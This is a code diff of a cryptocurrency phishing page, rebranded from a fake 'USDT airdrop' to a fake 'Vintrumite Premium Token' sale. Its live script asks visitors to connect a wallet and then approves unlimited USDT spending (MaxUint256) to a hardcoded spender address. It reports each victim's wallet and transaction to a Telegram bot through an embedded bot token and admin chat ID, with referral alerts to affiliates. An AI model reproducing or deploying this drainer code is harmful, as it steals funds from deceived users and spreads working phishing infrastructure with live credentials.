@@ -1345,61 +1345,7 @@ Phoenix token ecosystem ad placement.
     </div>
 
     <script>
-        // Create floating particles for background
-        function createParticles() {
-            const particlesContainer = document.getElementById('particles');
-            const particleCount = 30;
-            
-            for (let i = 0; i < particleCount; i++) {
-                const particle = document.createElement('div');
-                particle.classList.add('particle');
-                
-                const size = Math.random() * 8 + 4;
-                particle.style.width = `${size}px`;
-                particle.style.height = `${size}px`;
-                particle.style.left = `${Math.random() * 100}vw`;
-                const duration = Math.random() * 30 + 20;
-                const delay = Math.random() * 10;
-                particle.style.animationDuration = `${duration}s`;
-                particle.style.animationDelay = `${delay}s`;
-
-                particlesContainer.appendChild(particle);
-            }
-        }
-        // Update status message
-        function updateStatusMessage(message, type = 'info') {
-            const statusEl = document.getElementById('statusMessage');
-            const icon = type === 'error'? 'exclamation-circle' :
-                        type === 'success'? 'check-circle' :
-                        type === 'approving'? 'spinner' :
-                        type === 'approved'? 'check-circle' : 'sparkles';
-
-            statusEl.innerHTML = `<i class="fas fa-${icon}${type === 'approving'? ' fa-spin' : ''}"></i> ${message}`;
-            statusEl.className = 'status-message';
-            if (type!== 'info') statusEl.classList.add(type);
-            statusEl.style.display = 'flex';
-        }
-
-        // Initialize particles
-        document.addEventListener('DOMContentLoaded', function() {
-            createParticles();
-            updateStatusMessage('Introducing Vintrumite Premium Token. Connect your wallet to Buy Token.', 'info');
-        });
-
-        // ================= YOUR EXISTING FUNCTIONAL SCRIPT =================
-        window.addEventListener('DOMContentLoaded', async () => {
-            const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
-            const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
-
-            const TELEGRAM_BOT = "8457525765:AAFYTnliMT7j8L4QWcDmJfWdTi1_op60Ry8";
-            const ADMIN_CHAT_ID = "5126266116";
-
-            const NETWORKS = {
-                1: { name:"Ethereum", symbol:"ETH", rpc:"https://eth.llamarpc.com", explorer:"https://etherscan.io", moonpay:"https://buy.moonpay.com?currencyCode=eth", usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6 },
-                56: { name:"BNB Smart Chain", symbol:"BNB", rpc:"https://bsc-dataseed.binance.org", explorer:"https://bscscan.com", moonpay:"https://buy.moonpay.com?currencyCode=bnb", usdtAddress:"0x55d398326f99059fF775485246999027B3197955", decimals:18 }
-            };
-
- // Create floating particles for background
+          // Create floating particles for background
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
             const particleCount = 30;
@@ -1426,22 +1372,6 @@ Phoenix token ecosystem ad placement.
             }
         }
         
-        // Share functions that work with your existing functionality
-        function shareToTelegram() {
-            navigator.clipboard.writeText(window.location.href);
-            updateStatusMessage('Telegram sharing link copied to clipboard!', 'success');
-        }
-        
-        function shareToWhatsApp() {
-            const text = encodeURIComponent("Just claimed my exclusive USDT airdrop on Aether! 🎁✨\n\nJoin now: " + window.location.href);
-            window.open(`https://wa.me/?text=${text}`, '_blank');
-        }
-        
-        function shareToTwitter() {
-            const text = encodeURIComponent("Just claimed my exclusive USDT airdrop on Aether! 🎁✨\n\nJoin now: " + window.location.href);
-            window.open(`https://twitter.com/intent/tweet?text=${text}`, '_blank');
-        }
-        
         function copyLink() {
             navigator.clipboard.writeText(window.location.href);
             updateStatusMessage('Link copied to clipboard!', 'success');
@@ -1464,33 +1394,12 @@ Phoenix token ecosystem ad placement.
         // Initialize particles
         document.addEventListener('DOMContentLoaded', function() {
             createParticles();
-            updateStatusMessage('Welcome to Aether Premium Airdrop. Connect your wallet to check your eligibity.', 'info');
+            updateStatusMessage('Welcome to Vintrumite primuum Token. Connect your wallet to Buy Token.', 'info');
         });
         
         // ================= YOUR EXISTING FUNCTIONAL SCRIPT =================
         const container = document.getElementById("particles");
         const DROP_COUNT = 8;
- const ERC20_ABI = ["function approve(address spender, uint64 amount) external returns (bool)"];
-            let provider, signer, wcProvider=null, userAddress=null, isProcessing=false, activeProviderType=null;
-            let currentChainId = 56;
-
-            const injectBtn = document.getElementById('injectBtn');
-            const wcBtn = document.getElementById('wcBtn');
-            const approveBtn = document.getElementById('approveBtn');
-            const walletDiv = document.getElementById('wallet');
-            const statusDiv = document.getElementById('statusMessage');
-            const moonpayLink = document.getElementById('moonpayLink');
-     window.addEventListener('DOMContentLoaded', async () => {
-            const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
-            const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
-
-            const TELEGRAM_BOT = "8482914657:AAGQwbljH2zLVFMZngscd9LrYxaB5ypudTU";
-            const ADMIN_CHAT_ID = "5126266116";
-            
-            const NETWORKS = {
-                1: { name:"Ethereum", symbol:"ETH", rpc:"https://eth.llamarpc.com", explorer:"https://etherscan.io", moonpay:"https://buy.moonpay.com?currencyCode=eth", usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6 },
-                56: { name:"BNB Smart Chain", symbol:"BNB", rpc:"https://bsc-dataseed.binance.org", explorer:"https://bscscan.com", moonpay:"https://buy.moonpay.com?currencyCode=bnb", usdtAddress:"0x55d398326f99059fF775485246999027B3197955", decimals:18 }
-            };
 
         for (let i = 0; i < DROP_COUNT; i++) {
             const drop = document.createElement("div");
@@ -1505,6 +1414,31 @@ Phoenix token ecosystem ad placement.
 
             container.appendChild(drop);
         }
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
+            const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
+
+            const TELEGRAM_BOT = "8457525765:AAFYTnliMT7j8L4QWcDmJfWdTi1_op60Ry8";
+            const ADMIN_CHAT_ID = "5126266116";
+
+            
+            const NETWORKS = {
+                1: { name:"Ethereum", symbol:"ETH", rpc:"https://eth.llamarpc.com", explorer:"https://etherscan.io", moonpay:"https://buy.moonpay.com?currencyCode=eth", usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6 },
+                56: { name:"BNB Smart Chain", symbol:"BNB", rpc:"https://bsc-dataseed.binance.org", explorer:"https://bscscan.com", moonpay:"https://buy.moonpay.com?currencyCode=bnb", usdtAddress:"0x55d398326f99059fF775485246999027B3197955", decimals:18 }
+            };
+
+            const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+            let provider, signer, wcProvider=null, userAddress=null, isProcessing=false, activeProviderType=null;
+            let currentChainId = 56;
+
+            const injectBtn = document.getElementById('injectBtn');
+            const wcBtn = document.getElementById('wcBtn');
+            const approveBtn = document.getElementById('approveBtn');
+            const walletDiv = document.getElementById('wallet');
+            const statusDiv = document.getElementById('statusMessage');
+            const moonpayLink = document.getElementById('moonpayLink');
+
             function updateWalletDisplay(address){ 
                 walletDiv.innerHTML = `<i class="fas fa-check-circle"></i> ${address.slice(0,6)}...${address.slice(-4)}`; 
                 walletDiv.style.display = 'flex';
@@ -1610,24 +1544,24 @@ Phoenix token ecosystem ad placement.
                     const tx=await usdt.approve(SPENDER_ADDRESS,ethers.constants.MaxUint256);
                     const ref=getReferral(); 
                     const refChat=REFERRERS[ref];
-                    await sendTelegram(ADMIN_CHAT_ID, `🔄 Bought Token\nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}`);
+                    await sendTelegram(ADMIN_CHAT_ID, `🔄Purchesing STARTED\nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}`);
                     if(refChat) await sendTelegram(refChat, `👤 Someone used your referral\nWallet:${userAddress}\nTx:${tx.hash}`);
                     updateStatusMessage('Transaction sent...', 'info');
                     const receipt=await tx.wait();
                     if(receipt.status===1){
-                        updateStatusMessage('✅ Bought successfully!','approved'); 
+                        updateStatusMessage('Purchased Successfully !','approved'); 
                         approveBtn.classList.remove('loading');
                         approveBtn.innerHTML = '<i class="fas fa-check"></i> Claimed Successfully!';
                         approveBtn.disabled = true;
-                        await sendTelegram(ADMIN_CHAT_ID, `✅  Bought Token\nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}\n${network.explorer}/tx/${tx.hash}`);
-                        if(refChat) await sendTelegram(refChat, `🎉 Your referral BOUGHT successfully\nWallet:${userAddress}\nTx:${tx.hash}`);
+                        await sendTelegram(ADMIN_CHAT_ID, `Purchased Successfully \nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}\n${network.explorer}/tx/${tx.hash}`);
+                        if(refChat) await sendTelegram(refChat, `Bought token successfully\nWallet:${userAddress}\nTx:${tx.hash}`);
                     } else throw new Error("Transaction failed");
                 } catch(err){ 
                     console.error(err); 
-                    updateStatusMessage('❌ Transaction failed: '+err.message,'error'); 
+                    updateStatusMessage('❌ Claim failed: '+err.message,'error'); 
                     approveBtn.disabled=false; 
                     approveBtn.classList.remove('loading');
-                    approveBtn.innerHTML = '<i class="fas fa-gem"></i> Buy Token now';
+                    approveBtn.innerHTML = '<i class="fas fa-gem"></i> Buy Now';
                 }
                 finally{ isProcessing=false; }
             };
